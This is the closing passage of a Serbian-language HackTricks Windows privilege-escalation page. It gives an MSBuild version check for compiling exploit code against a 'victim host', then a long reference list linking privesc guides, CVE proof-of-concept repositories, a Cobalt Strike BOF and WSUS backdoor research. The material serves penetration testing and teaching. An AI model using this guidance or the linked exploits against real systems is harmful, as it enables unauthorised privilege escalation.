Projekat morate kompajlirati pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola za fascikle](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u - podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica o lokalnoj eskalaciji privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je nova crna (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – U potrazi za Silver Fox-om: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza sa prošlošću. Zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi sa kontrolnom listom za C/C++, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otimica-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: povezivanje CLDFLT i DirectX kernel race uslova radi LPE u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: primitiva za potpuno čitanje/pisanje u Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i druge korisne trikove](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Kod za eksploataciju FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, jednodnevna lokalna eskalacija privilegija u Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Ograničena delegacija zasnovana na Kerberos resursima: kako promena slike dovodi do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz Windows 10 SSH agenta](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Bezbednosni savet o eskalaciji privilegija putem pomaka deljene memorije u Windows MIDI Services-u](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
